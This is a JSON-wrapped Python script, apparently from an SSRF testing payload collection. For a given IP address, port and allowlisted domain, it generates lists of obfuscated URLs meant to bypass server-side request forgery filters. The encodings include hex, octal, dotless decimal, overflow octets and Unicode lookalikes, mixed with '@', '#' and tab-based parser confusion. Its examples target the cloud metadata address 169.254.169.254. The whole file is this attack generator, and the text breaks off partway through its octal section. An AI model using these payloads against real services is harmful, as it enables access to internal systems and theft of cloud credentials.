{"Server Side Request Forgery/Files/ip.py": "#!/usr/bin/python\n# coding=utf-8\n# https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/ip.py\nfrom __future__ import print_function\nfrom builtins import oct\nfrom builtins import str\nfrom builtins import hex\nfrom builtins import range\nfrom random import *\nfrom io import open\nimport datetime\nimport string\nimport os\nimport sys\nimport platform\nimport random\n\nEnclosedAlphanumericsData = {\n\t'0' : ['\u24ea'],\n\t'1' : ['\u2460'],\n\t'2' : ['\u2461'],\n\t'3' : ['\u2462'],\n\t'4' : ['\u2463'],\n\t'5' : ['\u2464'],\n\t'6' : ['\u2465'],\n\t'7' : ['\u2466'],\n\t'8' : ['\u2467'],\n\t'9' : ['\u2468'],\n\t'10' : ['\u2469'],\n\t'11' : ['\u246a'],\n\t'12' : ['\u246b'],\n\t'13' : ['\u246c'],\n\t'14' : ['\u246d'],\n\t'15' : ['\u246e'],\n\t'16' : ['\u246f'],\n\t'17' : ['\u2470'],\n\t'18' : ['\u2471'],\n\t'19' : ['\u2472'],\n\t'20' : ['\u2473'],\n\t'.' : ['\u3002','\uff61'],\n\t'a' : ['\u24d0'],\n\t'b' : ['\u24d1'],\n\t'c' : ['\u24d2'],\n\t'd' : ['\u24d3'],\n\t'e' : ['\u24d4'],\n\t'f' : ['\u24d5'],\n\t'x' : ['\u24e7'],\n}\n\ndef RANDOM_TEXT_SPEC():\n\tmin_char = 12\n\tmax_char = 16\n\tchars = string.ascii_letters + string.digits + \"!$%^&*()<>;:,.|\\~`\"\n\treturn \"\".join(choice(chars) for x in range(randint(min_char, max_char)))\n\ndef RANDOM_TEXT():\n\tmin_char = 12\n\tmax_char = 16\n\tchars = string.ascii_letters + string.digits\n\treturn \"\".join(choice(chars) for x in range(randint(min_char, max_char)))\n\ndef DECIMAL_SINGLE(NUMBER,STEP):\n\treturn int(NUMBER)*(256**STEP)\n\ndef HEX_SINGLE(NUMBER,ADD0X):\n\tif ADD0X == \"yes\":\n\t\treturn str(hex(int(NUMBER)))\n\telse:\n\t\treturn str(hex(int(NUMBER))).replace(\"0x\",\"\")\n\ndef OCT_SINGLE(NUMBER):\n\treturn str(oct(int(NUMBER))).replace(\"o\",\"\")\n\ndef DEC_OVERFLOW_SINGLE(NUMBER):\n\treturn str(int(NUMBER)+256)\n\ndef validIP(address):\n\tparts = address.split(\".\")\n\tif len(parts) != 4:\n\t\treturn False\n\ttry:\n\t\tfor item in parts:\n\t\t\tif not 0 <= int(item) <= 255:\n\t\t\t\treturn False\n\texcept ValueError:\n\t\tprint(\"\\nUsage: python \"+sys.argv[0]+\" IP EXPORT(optional)\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 export\")\n\t\texit(1)\n\treturn True\n\ndef plain2EnclosedAlphanumericsChar(s0):\n\tif s0 not in EnclosedAlphanumericsData:\n\t\traise Exception('value not found')\n\treturn random.choice(EnclosedAlphanumericsData[s0])\n\ndef convertIP2EnclosedAlphanumericsValue():\n\tIPAddressParts4EnclosedAlphanumerics = arg1.split(\".\")\n\treturnEnclosedAlphanumericsIPAddress = \"\"\n\tfor x in range(0,4):\n\t\tif len(IPAddressParts4EnclosedAlphanumerics[x]) == 3 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1])) <= 20 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]+IPAddressParts4EnclosedAlphanumerics[x][2])) >= 10:\n\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]);\n\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);\n\t\t\tif x <= 2:\n\t\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');\n\t\telse:\n\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]);\n\t\t\tif len(IPAddressParts4EnclosedAlphanumerics[x]) >= 2:\n\t\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][1]);\n\t\t\tif len(IPAddressParts4EnclosedAlphanumerics[x]) == 3:\n\t\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);\n\t\t\tif x <= 2:\n\t\t\t\treturnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');\n\treturn returnEnclosedAlphanumericsIPAddress\n\ndef convert(s, recurse_chunks=True, error_on_miss=False):\n\t\tif s in EnclosedAlphanumericsData:\n\t\t\treturn random.choice(EnclosedAlphanumericsData[s])\n\t\tif recurse_chunks and len(s) > 1:\n\t\t\treturn convert(s[:-1]) + convert(s[-1])\n\t\tif error_on_miss:\n\t\t\traise Exception('Value not found: %s' % s)\n\t\treturn s\n\ndef convert_ip(ip, sep='.'):\n\treturn convert(sep).join([convert(chunk) for chunk in ip.split(sep)])\n\nif len(sys.argv) < 4 or len(sys.argv) >= 6:\n\tprint(\"\\nUsage: python \"+sys.argv[0]+\" IP PORT WhiteListedDomain EXPORT(optional)\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 80 www.google.com\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 80 www.google.com export\")\n\texit(1)\n\nredcolor='\\x1b[0;31;40m'\ngreencolor='\\x1b[0;32;40m'\nyellowcolor='\\x1b[0;33;40m'\nbluecolor='\\x1b[0;36;40m'\nresetcolor='\\x1b[0m'\narg1 = str(sys.argv[1])\n\nif validIP(arg1) == False:\n\tprint(\"\\n\",yellowcolor,arg1,resetcolor,redcolor,\" is not a valid IPv4 address in dotted decimal format, example: 123.123.123.123\",resetcolor,sep='')\n\tprint(\"\\nUsage: python \"+sys.argv[0]+\" IP EXPORT(optional)\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 export\")\n\texit(1)\n\nipFrag3, ipFrag2, ipFrag1, ipFrag0 = arg1.split(\".\")\nPORT=str(sys.argv[2])\nRANDPREFIXTEXT=RANDOM_TEXT()\nRANDPREFIXTEXTSPEC=RANDOM_TEXT_SPEC()\nRANDOMPREFIXVALIDSITE=str(sys.argv[3])\nFILENAME=''\n\ntry:\n\tsys.argv[4]\nexcept IndexError:\n\tEXPORTRESULTS=''\nelse:\n\tEXPORTRESULTS=str(sys.argv[4])\n\nif EXPORTRESULTS == 'export':\n\tFILENAME = \"export-\" + arg1 + \"-\" + str(datetime.datetime.now().strftime(\"%H-%M-%d-%m-%Y\"))+'.txt'\n\tpythonversion = (platform.python_version())\n\tmajor, minor, patchlevel = pythonversion.split(\".\")\n\tif major == \"3\":\n\t\tf = open(FILENAME, 'w')\n\telse:\n\t\tf = open(FILENAME, 'wb')\nelif EXPORTRESULTS != '':\n\tprint(\"\\nUsage: python \"+sys.argv[0]+\" IP WhiteListedDomain EXPORT(optional)\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 80 www.google.com\\nUsage: python \"+sys.argv[0]+\" 169.254.169.254 80 www.google.com export\")\n\texit(1)\n\n#Case 1 - Dotted hexadecimal\nprint(\"\\n\",sep='')\nprint(bluecolor,\"Dotted hexadecimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP1 = HEX_SINGLE(ipFrag3,\"yes\") + \".\" + HEX_SINGLE(ipFrag2,\"yes\") + \".\" + HEX_SINGLE(ipFrag1,\"yes\") + \".\" + HEX_SINGLE(ipFrag0,\"yes\")\nprint('http://',IP1,':',PORT,'/',sep='')\nprint('http://',IP1,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/','/',sep='')\nprint('http://',IP1,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',sep='')\nprint('http://',IP1,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP1,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP1,':',PORT,'/',sep='')\nprint('http://',IP1,':',PORT,':80','/',sep='')\nprint('http://',IP1,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':',PORT,'/',file=f,sep='')\n\t#===========================================================================\n\tprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP1,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP1,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\t#===========================================================================\n\n#Case 2 - Dotless hexadecimal\nprint(bluecolor,\"Dotless hexadecimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP2 = HEX_SINGLE(ipFrag3,\"yes\") + HEX_SINGLE(ipFrag2,\"no\") + HEX_SINGLE(ipFrag1,\"no\") + HEX_SINGLE(ipFrag0,\"no\")\nprint('http://',IP2,':',PORT,'/',sep='')\nprint('http://',IP2,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP2,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',sep='')\nprint('http://',IP2,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP2,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP2,':',PORT,'/',sep='')\nprint('http://',IP2,':',PORT,':80','/',sep='')\nprint('http://',IP2,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP2,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP2,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP2,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP2,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 3 - Dotless decimal\nprint(bluecolor,\"Dotless decimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP3 = str(DECIMAL_SINGLE(ipFrag3,3) + DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))\nprint('http://',IP3,':',PORT,'/',sep='')\nprint('http://',IP3,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP3,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',sep='')\nprint('http://',IP3,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP3,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP3,':',PORT,'/',sep='')\nprint('http://',IP3,':',PORT,':80','/',sep='')\nprint('http://',IP3,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP3,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP3,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP3,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP3,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 4 - Dotted decimal with overflow(256)\nprint(bluecolor,\"Dotted decimal with overflow(256) IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP4 = DEC_OVERFLOW_SINGLE(ipFrag3) + \".\" + DEC_OVERFLOW_SINGLE(ipFrag2) + \".\" + DEC_OVERFLOW_SINGLE(ipFrag1) + \".\" + DEC_OVERFLOW_SINGLE(ipFrag0)\nprint('http://',IP4,':',PORT,'/',sep='')\nprint('http://',IP4,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP4,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',sep='')\nprint('http://',IP4,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP4,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP4,':',PORT,'/',sep='')\nprint('http://',IP4,':',PORT,':80','/',sep='')\nprint('http://',IP4,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP4,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP4,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP4,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP4,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 5 - Dotted octal\nprint(bluecolor,\"Dotted octal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP5 = OCT_SINGLE(ipFrag3) + \".\" + OCT_SINGLE(ipFrag2) + \".\" + OCT_SINGLE(ipFrag1) + \".\" + OCT_SINGLE(ipFrag0)\nprint('http://',IP5,':',PORT,'/',sep='')\nprint('http://',IP5,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP5,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',sep='')\nprint('http://',IP5,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP5,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP5,':',PORT,'/',sep='')\nprint('http://',IP5,':',PORT,':80','/',sep='')\nprint('http://',IP5,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP5,':',PORT,'%2509',RANDOMPREFIXV